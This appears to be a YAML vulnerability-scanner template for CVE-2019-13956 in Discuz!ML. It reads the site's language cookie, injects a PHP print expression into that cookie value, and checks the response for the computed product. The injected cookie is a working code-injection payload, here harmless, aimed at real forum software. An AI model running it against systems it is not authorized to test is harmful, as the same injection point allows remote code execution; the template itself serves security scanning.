name: yaml-poc-codersclub-discuz!ml-rce-CVE-2019-13956
binding: 09305cd9-e8ca-4972-99aa-8e6902153c40
detail:
    author: system_user
    links:
        - http://esoln.net/esoln/blog/2019/06/14/discuzml-v-3-x-code-injection-vulnerability/
        - https://nvd.nist.gov/vuln/detail/CVE-2019-13956
    vulnerability:
        id: c5da2333-b6e0-44ef-a3c4-7546eecfec48
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(1000, 9999)
    s2: randomInt(1000, 9999)
rules:
    r0:
        request:
            cache: false
            method: GET
            path: /
        expression: response.status == 200 && response.body.bcontains(b"language")
        output:
            search: '"Set-Cookie: (?P<test>.+?_[0-9]*_language=..)".bsubmatch(response.raw)'
            test: search["test"]
            abc: test + "'.print(" + string(s1) + "*" + string(s2) + ").'"
    r1:
        request:
            cache: false
            method: GET
            path: /
            headers:
                Cookie: '{{abc}}'
        expression: response.status == 200 && response.body.bstartsWith(bytes(string(s1 * s2) + "_1_1_common_header_forum_index.tpl.php"))
expression: r0() && r1()
